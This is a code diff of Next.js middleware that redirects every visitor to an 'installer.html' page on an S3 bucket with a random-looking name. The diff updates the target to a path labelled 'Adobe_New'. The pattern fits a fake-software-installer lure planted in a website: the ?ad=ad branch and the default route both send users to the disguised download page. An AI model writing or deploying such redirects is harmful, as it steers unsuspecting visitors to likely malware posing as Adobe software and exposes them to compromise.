@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://zz087-oiu-09po3.s3.us-east-1.amazonaws.com/NEW22D0cu51+vs.SC_/D06778cu097723rffnew9099/en/installer.html',
+      'https://01239397-29832986727655662-5656156567-723635356223.s3.us-east-1.amazonaws.com/newppoio-jwejkjwe/Adobe_New/en/installer.html',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://zz087-oiu-09po3.s3.us-east-1.amazonaws.com/NEW22D0cu51+vs.SC_/D06778cu097723rffnew9099/en/installer.html',
+    'https://01239397-29832986727655662-5656156567-723635356223.s3.us-east-1.amazonaws.com/newppoio-jwejkjwe/Adobe_New/en/installer.html',
     { status: 302 }
   )
 }
